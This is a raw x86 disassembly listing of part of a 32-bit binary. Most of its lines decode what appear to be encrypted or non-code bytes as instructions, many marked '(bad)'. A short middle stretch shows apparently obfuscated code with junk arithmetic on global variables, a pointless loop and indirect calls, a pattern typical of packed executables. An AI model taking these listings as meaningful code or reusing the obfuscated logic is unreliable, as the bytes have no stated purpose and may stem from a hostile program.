  403088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403089:	pop    ecx
  40308a:	cli    
  40308b:	push   esp
  40308c:	ficomp DWORD PTR [ebx+0x14]
  40308f:	cs jo  0x40310c
  403092:	pop    ebx
  403093:	ins    BYTE PTR es:[edi],dx
  403094:	xor    eax,DWORD PTR [esi]
  403096:	(bad)  
  403097:	lock addr16 mov edi,0xe82e5d4e
  40309e:	sahf   
  40309f:	mov    cl,0x91
  4030a1:	dec    eax
  4030a2:	js     0x403035
  4030a4:	jb     0x403085
  4030a6:	push   0x810e5d9d
  4030ab:	stc    
  4030ac:	jae    0x40311c
  4030ae:	div    ah
  4030b0:	cmp    al,0xde
  4030b2:	pushf  
  4030b3:	jnp    0x4030a5
  4030b5:	or     ebx,DWORD PTR [edx+0x32d0897b]
  4030bb:	fist   WORD PTR [ebx]
  4030bd:	sbb    bl,ah
  4030bf:	popa   
  4030c0:	jmp    0x403096
  4030c2:	fcmovu st,st(4)
  4030c4:	shl    eax,1
  4030c6:	call   0x971d8b9b
  4030cb:	ins    BYTE PTR es:[edi],dx
  4030cc:	or     al,0x95
  4030ce:	jns    0x403139
  4030d0:	dec    BYTE PTR [ecx-0x21]
  4030d3:	pushf  
  4030d4:	fild   DWORD PTR [esi]
  4030d6:	pop    eax
  4030d7:	int    0xdb
  4030d9:	int3   
  4030da:	lods   eax,DWORD PTR ds:[esi]
  4030db:	in     al,0x1d
  4030dd:	test   eax,0x7f3a730
  4030e2:	mov    edx,0xae8e2d77
  4030e7:	ret    
  4030e8:	jecxz  0x4030c8
  4030ea:	nop
  4030eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ec:	call   0x9fa5f77f
  4030f1:	add    DWORD PTR [esi-0x2d],eax
  4030f4:	ins    DWORD PTR es:[edi],dx
  4030f5:	add    BYTE PTR [esi+0x71b00a66],bl
  4030fb:	shl    dl,cl
  4030fd:	inc    ebp
  4030fe:	jns    0x403155
  403100:	push   ecx
  403101:	imul   ebp,DWORD PTR [ecx-0x57],0xffffff96
  403105:	hlt    
  403106:	push   ecx
  403107:	nop
  403108:	dec    eax
  403109:	loop   0x4030f6
  40310b:	mov    ecx,0x9e04bc88
  403110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403112:	jge    0x403147
  403114:	sub    DWORD PTR [ecx],esp
  403116:	pop    es
  403117:	adc    esp,ebp
  403119:	idiv   BYTE PTR [ecx]
  40311b:	gs inc ecx
  40311d:	push   ss
  40311e:	inc    eax
  40311f:	ins    BYTE PTR es:[edi],dx
  403120:	loopne 0x40316d
  403122:	mov    BYTE PTR [edx+0xb4651a3],cl
  403128:	arpl   WORD PTR [ebp+0x509f990b],bx
  40312e:	retf   
  40312f:	cmp    ebp,DWORD PTR [edx]
  403131:	fdivr  DWORD PTR [edx+0x6a73426f]
  403137:	pop    ecx
  403138:	frstor [ebx+0x29]
  40313b:	shl    dl,cl
  40313d:	xor    BYTE PTR [esi+0x1daa1ad3],0x41
  403144:	cmc    
  403145:	ret    0xc842
  403148:	cmp    al,0x95
  40314a:	push   0x67
  40314c:	std    
  40314d:	test   al,0x47
  40314f:	add    ch,BYTE PTR [ebx]
  403151:	inc    edx
  403152:	sub    eax,0x8bd83bc3
  403157:	sbb    cl,dl
  403159:	iret   
  40315a:	frstor [ecx+ebp*1-0x4]
  40315e:	sub    DWORD PTR [ebx],0x498c2367
  403164:	pop    edi
  403165:	pop    edx
  403166:	outs   dx,DWORD PTR ds:[esi]
  403167:	stos   DWORD PTR es:[edi],eax
  403168:	mov    ds:0xb6789b47,eax
  40316d:	push   cs
  40316e:	mov    al,BYTE PTR [edx-0x19e78cfb]
  403174:	enter  0x5fb4,0x2e
  403178:	fstp   TBYTE PTR [eax+0x3b]
  40317b:	mov    esp,0x43c24032
  403180:	and    DWORD PTR [ebp-0x748ebc51],edi
  403186:	xchg   edx,eax
  403187:	dec    ecx
  403188:	sbb    BYTE PTR [ebp+0x473d764a],ch
  40318e:	or     ch,BYTE PTR [eax]
  403190:	sub    esi,ebx
  403192:	pop    esp
  403193:	pusha  
  403194:	div    DWORD PTR [esi]
  403196:	shr    ah,0xed
  403199:	inc    ebp
  40319a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319b:	inc    edi
  40319c:	dec    ebp
  40319d:	xor    al,0x8a
  40319f:	cmp    BYTE PTR [ebx-0x3d8497f8],cl
  4031a5:	cld    
  4031a6:	sub    DWORD PTR [eax],edx
  4031a8:	lds    ebp,FWORD PTR [ecx-0x70e4747f]
  4031ae:	sbb    eax,0x6bec715b
  4031b3:	add    ecx,eax
  4031b5:	jp     0x403208
  4031b7:	or     edi,edx
  4031b9:	or     cl,bl
  4031bb:	inc    ebx
  4031bc:	inc    ecx
  4031bd:	push   ecx
  4031be:	test   al,0xbf
  4031c0:	fidivr WORD PTR [ecx-0x58aebd18]
  4031c6:	mov    al,0x13
  4031c8:	stos   BYTE PTR es:[edi],al
  4031c9:	sbb    al,BYTE PTR [esi]
  4031cb:	pusha  
  4031cc:	xchg   ebx,eax
  4031cd:	or     edi,DWORD PTR [ebx-0x3d5b0858]
  4031d3:	adc    BYTE PTR [ecx],0xd9
  4031d6:	out    0xe5,eax
  4031d8:	xchg   edx,eax
  4031d9:	inc    ebp
  4031da:	pop    ebp
  4031db:	test   BYTE PTR [ebx],bh
  4031dd:	in     al,dx
  4031de:	not    DWORD PTR [ebx]
  4031e0:	pop    ecx
  4031e1:	in     eax,0xe7
  4031e3:	popa   
  4031e4:	mov    ecx,0xcad92068
  4031e9:	inc    edx
  4031ea:	les    ecx,FWORD PTR [ebp-0x56]
  4031ed:	scas   eax,DWORD PTR es:[edi]
  4031ee:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4031f0:	push   0xe6a2790d
  4031f5:	enter  0xe6b7,0x8f
  4031f9:	fnstcw WORD PTR [ebx-0x8]
  4031fc:	lock adc al,0x74
  4031ff:	jne    0x4031b7
  403201:	pushf  
  403202:	lods   al,BYTE PTR ds:[esi]
  403203:	mov    DWORD PTR [ebx+0x7956e8b4],esp
  403209:	push   ebx
  40320a:	sbb    al,0x9
  40320c:	adc    ecx,ebx
  40320e:	mov    ecx,DWORD PTR [edx+esi*1]
  403211:	mov    al,0xfa
  403213:	push   0xffffffd8
  403215:	neg    DWORD PTR [esi]
  403217:	mov    ds:0xa9ba6491,eax
  40321c:	jecxz  0x4031fb
  40321e:	ret    0xf21
  403221:	and    DWORD PTR ss:[esp+ebx*8-0x4d06620f],eax
  403229:	adc    BYTE PTR [ecx-0x6f0c0d81],0x55
  403230:	ret    0x7196
  403233:	ja     0x4031f3
  403235:	ds mov bl,0x42
  403238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403239:	pop    ebp
  40323a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40323b:	jecxz  0x4032a7
  40323d:	and    ch,dh
  40323f:	ins    DWORD PTR es:[edi],dx
  403240:	jo     0x4031fe
  403242:	or     eax,ebp
  403244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403245:	int    0x9f
  403247:	inc    ecx
  403248:	(bad)  
  40324a:	push   es
  40324b:	push   cs
  40324c:	and    DWORD PTR [eax+eiz*1-0x1eaeb4c8],ecx
  403253:	sbb    DWORD PTR [edi],edx
  403255:	or     al,0xd7
  403258:	jnp    0x40322f
  40325a:	inc    edx
  40325b:	xchg   edi,eax
  40325c:	lock push 0x75
  40325f:	frstor [esi]
  403261:	xchg   edx,eax
  403262:	mov    al,ds:0x1093718a
  403267:	test   eax,0x1cc73655
  40326c:	dec    eax
  40326d:	inc    DWORD PTR [ebx-0x53e3ac94]
  403273:	ins    BYTE PTR es:[edi],dx
  403274:	scas   eax,DWORD PTR es:[edi]
  403275:	lods   eax,DWORD PTR ds:[esi]
  403276:	fxch   st(7)
  403278:	jne    0x40320d
  40327a:	adc    ah,BYTE PTR [ecx+0x3d]
  40327d:	out    dx,al
  40327e:	mov    ds:0x195f612d,al
  403283:	ret    
  403284:	or     ebx,ebx
  403286:	xchg   ebx,eax
  403287:	daa    
  403288:	or     esi,esp
  40328a:	jle    0x403280
  40328c:	adc    al,0xb5
  40328e:	sbb    dl,BYTE PTR [esi]
  403290:	sub    ecx,DWORD PTR [ebp+0xa0df2ce]
  403296:	xor    DWORD PTR [edx-0x6a],ebx
  403299:	xor    DWORD PTR [edx+0x18],edi
  40329c:	mov    dh,0x7b
  40329e:	or     eax,0xb8f6c8ad
  4032a3:	xor    cl,cl
  4032a5:	adc    DWORD PTR [esi],eax
  4032a7:	cwde   
  4032a8:	dec    edi
  4032a9:	add    bl,BYTE PTR [eax]
  4032ab:	aas    
  4032ac:	loope  0x4032f9
  4032ae:	xchg   ebx,eax
  4032af:	scas   al,BYTE PTR es:[edi]
  4032b0:	scas   al,BYTE PTR es:[edi]
  4032b1:	outs   dx,BYTE PTR ds:[esi]
  4032b2:	mov    edi,0x30881b24
  4032b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b8:	fsubr  QWORD PTR [ebp+0x8]
  4032bb:	sbb    eax,0x571c9471
  4032c0:	popf   
  4032c1:	adc    DWORD PTR [eax+edx*2-0x18559cb],0x64e170ec
  4032cc:	out    0x31,eax
  4032ce:	mov    eax,0xcaa0884a
  4032d3:	int3   
  4032d4:	mov    WORD PTR [ecx+0x3de82211],gs
  4032da:	inc    ebp
  4032db:	outs   dx,BYTE PTR ds:[esi]
  4032dc:	imul   edx,DWORD PTR [edx+0x34466f07],0x52
  4032e3:	pop    ebx
  4032e4:	(bad)  
  4032e5:	sbb    eax,0xe40df7d8
  4032ea:	aam    0x9c
  4032ec:	push   edx
  4032ed:	ror    DWORD PTR [edx+eiz*4],1
  4032f0:	push   ebx
  4032f1:	sub    bl,BYTE PTR [edx+ecx*4]
  4032f4:	and    DWORD PTR [ebp+0x113be171],0x893e587a
  4032fe:	ins    BYTE PTR es:[edi],dx
  4032ff:	rcl    ecx,cl
  403301:	daa    
  403302:	mov    bl,0x1d
  403304:	or     esi,eax
  403306:	jmp    0x1589:0xa93a195f
  40330d:	cli    
  40330e:	sub    esp,esi
  403310:	out    dx,eax
  403311:	xor    BYTE PTR [ebx],dl
  403313:	dec    eax
  403314:	mov    ebp,es
  403316:	mov    eax,fs
  403318:	(bad)  
  403319:	pushf  
  40331a:	fcomp  DWORD PTR es:[esi+0xd]
  40331e:	xor    cl,bh
  403320:	int    0x6e
  403322:	xchg   ecx,eax
  403323:	out    0xb7,eax
  403325:	ins    BYTE PTR es:[edi],dx
  403326:	cmp    DWORD PTR [ecx],esi
  403328:	aas    
  403329:	ss mov edi,0x7c310291
  40332f:	imul   ebx,DWORD PTR [edx+0x17],0xffffffc6
  403333:	repnz cmp eax,DWORD PTR [edx+0x45]
  403337:	in     al,dx
  403338:	loope  0x4032f0
  40333a:	push   esp
  40333b:	lea    ebp,[ecx]
  40333d:	mov    ebx,0x3f8cee87
  403342:	(bad)  
  403343:	mov    eax,DWORD PTR [eax]
  403345:	xchg   ebx,eax
  403346:	cld    
  403347:	aad    0xe4
  403349:	call   0xe3c4c651
  40334e:	rol    BYTE PTR [edi+0x4c],0xaa
  403352:	enter  0x64e,0x25
  403356:	loop   0x4032dc
  403358:	mov    ah,0xca
  40335a:	inc    BYTE PTR [ecx-0x3eab26bb]
  403360:	mov    DWORD PTR [bp+si-0x47],edx
  403364:	jbe    0x4033d9
  403366:	ficomp DWORD PTR [edi+0x6c135240]
  40336c:	mov    ah,0xff
  40336e:	mov    BYTE PTR [edi+eiz*4-0x52],dl
  403372:	repz cmc 
  403374:	xor    al,0xdf
  403376:	adc    ebp,DWORD PTR [edi+ecx*8+0x24]
  40337a:	in     al,dx
  40337b:	lods   eax,DWORD PTR ds:[esi]
  40337c:	sub    eax,0xf8355a3e
  403381:	mov    esp,0x8f4f4056
  403386:	inc    ecx
  403387:	push   0xffffffd1
  403389:	loope  0x40332b
  40338b:	inc    esp
  40338c:	push   0x4b
  40338e:	push   eax
  40338f:	clc    
  403390:	cdq    
  403391:	sub    DWORD PTR [ecx],ecx
  403393:	push   ss
  403394:	adc    DWORD PTR [edx-0x6a],ecx
  403397:	ja     0x403363
  403399:	or     al,0x84
  40339b:	enter  0x8305,0x30
  40339f:	js     0x40337b
  4033a1:	(bad)  
  4033a2:	in     eax,dx
  4033a3:	inc    esp
  4033a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a5:	mov    ebx,0xc34cac1c
  4033aa:	and    al,0xd5
  4033ac:	ja     0x4033c3
  4033ae:	push   ebp
  4033af:	repnz arpl cx,bp
  4033b2:	xlat   BYTE PTR ds:[ebx]
  4033b3:	test   BYTE PTR [ecx-0x42],bl
  4033b6:	dec    esp
  4033b7:	push   cs
  4033b8:	mov    dl,0xb
  4033ba:	inc    edi
  4033bb:	jo     0x40342b
  4033bd:	pop    ss
  4033be:	xor    dl,BYTE PTR [edx-0x39]
  4033c1:	ret    0x367
  4033c4:	mov    edx,0x71d827da
  4033c9:	mov    ds:0x466513a4,al
  4033ce:	(bad)  
  4033cf:	sbb    ah,cl
  4033d1:	test   ah,bl
  4033d3:	popf   
  4033d4:	(bad)
  4033d8:	add    eax,0x3f65b5d9
  4033dd:	test   DWORD PTR [esi+0x1b91df1e],edi
  4033e3:	sti    
  4033e4:	mov    DWORD PTR [edx+0x16a0c397],ecx
  4033ea:	mov    es:0x14c2d476,eax
  4033f0:	jmp    0x307f1c77
  4033f5:	outs   dx,DWORD PTR ds:[esi]
  4033f6:	pusha  
  4033f7:	xor    BYTE PTR [ebx],dh
  4033f9:	or     esi,DWORD PTR [edx]
  4033fb:	arpl   WORD PTR [edx-0x27aec5cc],sp
  403401:	(bad)  
  403402:	dec    eax
  403403:	mov    ebx,DWORD PTR ds:0x7e75e13
  403409:	xchg   edi,eax
  40340a:	loopne 0x40346b
  40340c:	mov    dh,0x1
  40340e:	jl     0x4033ca
  403410:	xor    cl,BYTE PTR [ebx-0x61d0f60a]
  403416:	xchg   ebp,eax
  403417:	cmc    
  403418:	inc    BYTE PTR [esi-0x5e]
  40341b:	push   esi
  40341c:	jb     0x403405
  40341e:	xor    eax,0xfcfb3777
  403423:	pusha  
  403424:	xchg   DWORD PTR [esi-0xd3dc2da],ebp
  40342a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40342b:	loopne 0x403429
  40342d:	loopne 0x40349c
  40342f:	mov    eax,esp
  403431:	enter  0x7273,0xc8
  403435:	mov    BYTE PTR [ebp+0x7246c5a3],0xb7
  40343c:	in     eax,dx
  40343d:	and    dh,bh
  40343f:	mov    dl,0xd9
  403441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403442:	xor    dh,0x35
  403445:	scas   al,BYTE PTR es:[edi]
  403446:	lods   eax,DWORD PTR ds:[esi]
  403447:	xchg   edx,eax
  403448:	iret   
  403449:	repz adc bl,BYTE PTR ds:[esi+ebx*8]
  40344e:	add    eax,0x6bb76820
  403453:	or     eax,0x5fa01bb2
  403458:	xchg   ebx,eax
  403459:	mov    edx,0x8ec52bf
  40345e:	test   DWORD PTR [ebx],ecx
  403460:	mov    ecx,0x959bbe20
  403465:	(bad)
  403468:	pop    edx
  403469:	(bad)  
  40346a:	f2xm1  
  40346c:	movntq QWORD PTR [ecx+eax*4-0x36290106],mm6
  403474:	mov    edx,0x7313b918
  403479:	out    dx,al
  40347a:	retf   
  40347b:	xor    edx,DWORD PTR [edx]
  40347d:	sub    BYTE PTR [ecx],bh
  40347f:	push   edx
  403480:	int    0xc9
  403482:	inc    DWORD PTR [edi*1-0x699b4230]
  403489:	bound  eax,QWORD PTR [ecx]
  40348b:	enter  0xbeaf,0xca
  40348f:	(bad)  
  403490:	out    0x1f,eax
  403492:	(bad)  
  403493:	xor    al,0xe7
  403495:	xchg   ebx,eax
  403496:	mov    bh,0x5e
  403498:	or     al,0xa8
  40349a:	lock add cl,dl
  40349d:	pusha  
  40349e:	xor    eax,0x6613d0d3
  4034a3:	ret    0x23d3
  4034a6:	ins    DWORD PTR es:[edi],dx
  4034a7:	lahf   
  4034a8:	mov    edx,0xfdaeb92
  4034ad:	imul   ebp,DWORD PTR [esi-0x51],0xe770907
  4034b4:	jbe    0x403498
  4034b6:	shl    al,0x2b
  4034b9:	sbb    eax,0x58c519d9
  4034be:	xchg   ecx,eax
  4034bf:	popa   
  4034c0:	xchg   ebx,eax
  4034c1:	jle    0x4034cc
  4034c3:	imul   edi,ebx,0xb9485735
  4034c9:	jg     0x403535
  4034cb:	into   
  4034cc:	mov    al,ds:0xf0f7c826
  4034d1:	cwde   
  4034d2:	hlt    
  4034d3:	and    DWORD PTR [ecx+0x5a72531d],0xffffffa7
  4034da:	sbb    ch,dh
  4034dc:	jns    0x4034f1
  4034de:	outs   dx,BYTE PTR ds:[esi]
  4034df:	sub    ch,BYTE PTR [ebx+0x34d0348]
  4034e5:	dec    ebx
  4034e6:	cwde   
  4034e7:	xor    al,0xa0
  4034e9:	outs   dx,DWORD PTR ds:[esi]
  4034ea:	out    dx,al
  4034eb:	ins    DWORD PTR es:[edi],dx
  4034ec:	dec    ecx
  4034ed:	dec    esp
  4034ee:	sbb    ebx,DWORD PTR [eax]
  4034f0:	inc    ebx
  4034f1:	dec    edi
  4034f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f3:	cmp    dl,BYTE PTR [ebx+0x40867b3b]
  4034f9:	push   edi
  4034fa:	mov    ds:0x95c0f867,al
  4034ff:	ins    BYTE PTR es:[edi],dx
  403500:	and    al,0xb0
  403502:	cwde   
  403503:	and    ecx,ebx
  403505:	fist   WORD PTR [esi+esi*1+0x22bcf910]
  40350c:	adc    ah,BYTE PTR [ecx+0x4748412c]
  403512:	or     al,0x7d
  403514:	ror    ch,cl
  403516:	sub    bh,dl
  403518:	sub    eax,0xa50fbc1c
  40351d:	xor    al,0x14
  40351f:	push   edx
  403520:	mul    dh
  403522:	or     eax,0xffffffa4
  403525:	mov    dl,0xf7
  403527:	inc    esp
  403528:	lds    esi,FWORD PTR [edi]
  40352a:	mov    ebx,0xb2e11ffd
  40352f:	sbb    eax,ecx
  403531:	mov    cl,0xd4
  403533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403534:	in     al,dx
  403535:	aam    0x99
  403537:	and    eax,0xdb02277c
  40353c:	pushf  
  40353d:	push   0xe27659eb
  403542:	adc    eax,0xdc86331d
  403547:	(bad)  [edx]
  403549:	js     0x403537
  40354b:	cld    
  40354c:	add    edi,DWORD PTR [eax]
  40354e:	popf   
  40354f:	mov    WORD PTR [eax-0x3259dbcc],es
  403555:	aas    
  403556:	int    0x21
  403558:	mov    BYTE PTR [esi],ch
  40355a:	mov    ds:0x1ca35b,al
  40355f:	xchg   ebx,eax
  403560:	(bad)  
  403561:	stos   BYTE PTR es:[edi],al
  403562:	or     BYTE PTR [ebx],al
  403564:	int3   
  403565:	out    0x13,eax
  403567:	cmp    cl,dh
  403569:	adc    DWORD PTR [eax+esi*1+0x5d],ecx
  40356d:	pop    eax
  40356e:	imul   DWORD PTR [esi+0x1e57577d]
  403574:	cdq    
  403575:	xchg   edx,eax
  403576:	(bad)  
  403577:	pop    eax
  403578:	xchg   ebx,eax
  403579:	and    BYTE PTR [ecx+0x61],ah
  40357c:	inc    edx
  40357d:	loopne 0x40355f
  40357f:	lods   al,BYTE PTR ds:[esi]
  403580:	int3   
  403581:	sbb    dh,ah
  403583:	stos   BYTE PTR es:[edi],al
  403584:	cmp    BYTE PTR [ecx+0x30],ah
  403587:	outs   dx,DWORD PTR ds:[esi]
  403588:	push   ds
  403589:	les    ebx,FWORD PTR [esi]
  40358b:	das    
  40358c:	pop    esi
  40358d:	mov    edx,ss
  40358f:	jg     0x403523
  403591:	sub    al,0x22
  403593:	ror    DWORD PTR [ecx],1
  403595:	pop    edi
  403596:	jbe    0x40358c
  403598:	xchg   al,bh
  40359a:	push   ss
  40359b:	(bad)  
  40359c:	adc    eax,0x7c7a90c4
  4035a1:	fidivr WORD PTR [esi-0x333fd1c1]
  4035a7:	or     eax,0xae6383eb
  4035ac:	bound  esi,QWORD PTR [edi-0xf]
  4035af:	jne    0x403586
  4035b1:	cwde   
  4035b2:	(bad)  
  4035b3:	leave  
  4035b4:	mov    DWORD PTR [eax+0x15],ebx
  4035b7:	cmc    
  4035b8:	xchg   BYTE PTR [ebp+0x82262db],dl
  4035be:	cli    
  4035bf:	xchg   esi,eax
  4035c0:	cmp    DWORD PTR [bp-0x76],edx
  4035c4:	cmp    DWORD PTR [esi],edi
  4035c6:	mov    ebp,0xc9906905
  4035cb:	cwde   
  4035cc:	cmp    dh,bh
  4035ce:	gs test dh,al
  4035d1:	lods   al,BYTE PTR ds:[esi]
  4035d2:	inc    BYTE PTR ds:0xecfab745
  4035d8:	pop    edi
  4035d9:	xchg   esp,eax
  4035da:	cwde   
  4035db:	jmp    0x40361d
  4035dd:	leave  
  4035de:	or     eax,0xe063db4e
  4035e3:	dec    eax
  4035e4:	mov    edx,0x40e406ed
  4035e9:	mov    edx,0x5153b865
  4035ee:	push   edi
  4035ef:	xchg   ebp,eax
  4035f0:	imul   esi,DWORD PTR [ecx],0x7ecb317
  4035f6:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  403600:	mov    eax,ds:0x42a27e
  403605:	or     DWORD PTR ds:0x42a27a,eax
  40360b:	mov    eax,DWORD PTR [ebp-0x14]
  40360e:	mov    DWORD PTR [ebp-0x9c],eax
  403614:	adc    DWORD PTR ds:0x42a29a,ecx
  40361a:	mov    eax,DWORD PTR [ebp-0x18]
  40361d:	mov    DWORD PTR [ebp-0x98],eax
  403623:	sbb    DWORD PTR ds:0x42a28a,0x5122
  40362d:	mov    eax,DWORD PTR [ebp-0x2c]
  403630:	xor    eax,esi
  403632:	add    eax,edi
  403634:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  40363e:	mov    DWORD PTR [ebp-0x94],eax
  403644:	lea    eax,[ebp-0x48]
  403647:	mov    DWORD PTR [ebp-0x90],eax
  40364d:	mov    eax,DWORD PTR [ebp-0xa0]
  403653:	xor    eax,esi
  403655:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  40365f:	add    eax,edi
  403661:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40366b:	mov    DWORD PTR [ebp-0xa0],eax
  403671:	sub    DWORD PTR ds:0x42a272,0x1d49
  40367b:	lea    eax,[ebp-0xa0]
  403681:	push   eax
  403682:	neg    eax
  403684:	mov    eax,DWORD PTR [ebp+0xc]
  403687:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403691:	xor    eax,esi
  403693:	add    eax,edi
  403695:	push   eax
  403696:	mov    eax,ds:0x42943e
  40369b:	push   0x429394
  4036a0:	mov    DWORD PTR ds:0x42a286,0x524d
  4036aa:	push   DWORD PTR [eax]
  4036ac:	call   0x4084f6
  4036b1:	xor    edx,edx
  4036b3:	add    edx,DWORD PTR ds:0x42a29e
  4036b9:	and    DWORD PTR ds:0x42a28e,edx
  4036bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4036c2:	mov    eax,DWORD PTR [ebp-0x18]
  4036c5:	mov    DWORD PTR [ebp-0x58],eax
  4036c8:	mov    eax,ds:0x42a306
  4036cd:	mov    edx,DWORD PTR ds:0x42a34e
  4036d3:	sub    edx,eax
  4036d5:	sub    eax,DWORD PTR [eax+edx*1]
  4036d8:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4036df:	mov    eax,0xf89c85bb
  4036e4:	mov    DWORD PTR [ebp-0x1c],eax
  4036e7:	xor    DWORD PTR ds:0x42a286,0x37ec
  4036f1:	lea    ecx,[eax-0x16]
  4036f4:	and    DWORD PTR ds:0x42a2e2,0x0
  4036fe:	jmp    0x403710
  403703:	mov    edx,DWORD PTR ds:0x42a2e2
  403709:	inc    edx
  40370a:	mov    DWORD PTR ds:0x42a2e2,edx
  403710:	cmp    DWORD PTR ds:0x42a2e2,0x18
  403717:	jae    0x40376b
  40371d:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403724:	jl     0x40376b
  40372a:	jmp    0x40374c
  40372f:	push   DWORD PTR [ebp-0x20]
  403732:	push   DWORD PTR [ebp-0x18]
  403735:	push   DWORD PTR [ebp-0x20]
  403738:	push   DWORD PTR [ebp-0x18]
  40373b:	push   DWORD PTR [ebp-0x14]
  40373e:	push   DWORD PTR [ebp-0x20]
  403741:	push   0x429247
  403746:	call   DWORD PTR ds:0x42a3d6
  40374c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403753:	jne    0x403766
  403759:	mov    edx,DWORD PTR ds:0x42a2e2
  40375f:	inc    edx
  403760:	mov    DWORD PTR ds:0x42a2e2,edx
  403766:	jmp    0x403703
  40376b:	mov    DWORD PTR [ebp-0x28],ecx
  40376e:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  403775:	neg    DWORD PTR ds:0x42a25e
  40377b:	mov    DWORD PTR [ebp-0x8],eax
  40377e:	xor    edx,edx
  403780:	or     edx,DWORD PTR ds:0x42a2da
  403786:	xor    DWORD PTR ds:0x42a29a,edx
  40378c:	mov    eax,DWORD PTR [ebp-0x10]
  40378f:	neg    edx
  403791:	xor    eax,esi
  403793:	mov    edx,0xffcd8d8f
  403798:	sub    edx,eax
  40379a:	mov    eax,ds:0x42a2fe
  40379f:	mov    DWORD PTR [ebp-0xc],edx
  4037a2:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  4037a9:	mov    eax,DWORD PTR [ebp-0x8]
  4037ac:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  4037b6:	mov    DWORD PTR [ebp-0x3c],ebx
  4037b9:	mov    DWORD PTR ds:0x42a286,0xb52
  4037c3:	cmp    eax,ecx
  4037c5:	mov    DWORD PTR ds:0x42a2d2,0x1900
  4037cf:	je     0x408220
  4037d5:	xor    DWORD PTR ds:0x42a2b6,edx
  4037db:	mov    eax,DWORD PTR [ebp-0x10]
  4037de:	jmp    0x405b37
  4037e3:	or     al,BYTE PTR es:[edx-0x17]
  4037e7:	inc    edx
  4037e8:	mov    eax,ds:0x1d8d8286
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	mov    al,ds:0x5470a472
  4037f3:	inc    edi
  4037f4:	pop    esi
  4037f5:	add    DWORD PTR [ebx-0x7c7ca1b9],0x79
  4037fc:	push   ds
  4037fd:	mov    cl,0x82
  4037ff:	jae    0x40386d
  403801:	mov    ds:0x9993834d,eax
  403806:	loop   0x40387f
  403808:	stos   DWORD PTR es:[edi],eax
  403809:	and    bh,BYTE PTR [ecx]
  40380b:	(bad)  
  40380c:	arpl   WORD PTR [edx],dx
  40380e:	jnp    0x4037a6
  403810:	push   esp
  403811:	cmc    
  403812:	cmp    BYTE PTR [edi],ah
  403814:	mov    ah,BYTE PTR [esi+eax*8]
  403817:	sbb    eax,ecx
  403819:	mov    al,0x12
  40381b:	mov    gs,WORD PTR [ebp-0x69]
  40381e:	lods   al,BYTE PTR ds:[esi]
  40381f:	arpl   WORD PTR [eax-0x3e47c10],ax
  403825:	loope  0x40387c
  403827:	js     0x403835
  403829:	dec    ecx
  40382a:	pop    edx
  40382b:	in     al,dx
  40382c:	mov    dh,0x16
  40382e:	pop    ebp
  40382f:	inc    DWORD PTR [ebp-0x22]
  403832:	mov    ch,bh
  403834:	push   edi
  403835:	or     eax,0xde85cb79
  40383a:	test   DWORD PTR [eax+eiz*2+0x7],0x66855f56
  403842:	call   FWORD PTR [eax]
  403844:	aad    0xc8
  403846:	je     0x4038bf
  403848:	js     0x40389d
  40384a:	retf   0xc308
  40384d:	dec    edi
  40384e:	cmp    eax,0x221e086d
  403853:	add    edx,DWORD PTR [ebx]
  403855:	xchg   ebx,eax
  403856:	cmp    bl,bh
  403858:	repnz cmp eax,0x6a918694
  40385e:	jge    0x4038bc
  403860:	xchg   BYTE PTR [edi-0x2d],dl
  403863:	add    bh,0xcb
  403866:	clc    
  403867:	test   al,0x3f
  403869:	fsub   st(4),st
  40386b:	jno    0x403839
  40386d:	mov    esi,DWORD PTR [eax]
  40386f:	stos   DWORD PTR es:[edi],eax
  403870:	adc    esp,DWORD PTR [ecx+edx*4-0x35a6accc]
  403877:	add    ch,al
  403879:	aam    0xfb
  40387b:	jns    0x4037fd
  40387d:	xchg   ebx,eax
  40387e:	fdivr  DWORD PTR [esi+eax*1+0x467b747b]
  403885:	xchg   ecx,eax
  403886:	cmc    
  403887:	dec    esi
  403888:	aam    0x19
  40388a:	push   edx
  40388b:	xchg   ecx,eax
  40388c:	pop    ss
  40388d:	outs   dx,BYTE PTR ds:[esi]
  40388e:	jae    0x4038bb
  403890:	mov    ebx,0x4575432e
  403895:	pop    esp
  403896:	popa   
  403897:	lods   al,BYTE PTR ds:[esi]
  403898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403899:	jg     0x40390d
  40389b:	pop    ds
  40389c:	sub    dl,BYTE PTR [ebx+0x69]
  40389f:	loop   0x403900
  4038a1:	aad    0xfd
  4038a3:	jnp    0x4038a5
  4038a5:	and    al,dl
  4038a7:	inc    ebp
  4038a8:	or     al,ch
  4038aa:	cmp    esi,ecx
  4038ac:	mov    bl,BYTE PTR [ecx-0x646a5271]
  4038b2:	(bad)  
  4038b3:	fsub   st(2),st
  4038b5:	sub    ebp,edi
  4038b7:	xchg   esi,eax
  4038b8:	enter  0x62b1,0x6b
  4038bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038bd:	int    0x0
  4038bf:	bound  edx,QWORD PTR [edx]
